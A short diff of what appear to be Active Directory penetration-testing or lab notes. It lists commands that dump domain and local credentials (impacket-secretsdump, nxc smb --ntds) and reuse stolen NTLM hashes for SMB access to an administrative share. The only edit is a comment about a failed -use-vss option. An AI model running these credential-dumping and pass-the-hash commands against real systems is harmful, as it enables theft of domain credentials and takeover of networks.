@@ -102,6 +102,6 @@ impacket-secretsdump  -security DC01_10.1.152.66_2026-11-09_192124.SAM -system D
 
  nxc smb 10.1.139.60 -u 'svc_gmsa$' -H 'hash' --ntds -M backup_operator
 
-impacket-secretsdump 'domain/Administrator@10.0.31.8' -hashes :<hash> -use-vss
+impacket-secretsdump 'domain/Administrator@10.0.31.8' -hashes :<hash> # -use-vss can be used, but my impacket pycrypto dome seemed to be corrupted and wasn't parsing the NTDS.dit properly
 #Note, the secrets dump worked despite not specifying the domain. Maybe cuz of local admin?
 smbclient //10.0.31.8/C$ -U 'Administrator' --pw-nt-hash 'hash'
